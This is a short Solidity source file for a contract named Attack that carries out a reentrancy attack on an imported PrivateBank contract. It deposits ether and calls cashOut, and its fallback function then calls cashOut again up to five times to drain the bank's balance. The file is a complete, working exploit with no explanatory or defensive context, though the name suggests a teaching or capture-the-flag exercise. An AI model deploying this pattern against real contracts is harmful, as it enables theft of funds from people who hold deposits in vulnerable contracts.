pragma solidity >=0.4.21 <0.6.0;

import "./PrivateBank.sol";

contract Attack {
  PrivateBank public target;

  uint n = 5;

  constructor(address payable _target) public {
    target = PrivateBank(_target);
  }

  function () external payable {
    if (n > 0) {
      n -= 1;
      uint amount = target.balances(address(this));
      target.cashOut(amount);
    }
  }

  function attack() external payable {
    target.deposit.value(msg.value)();
    target.cashOut(msg.value);
  }
}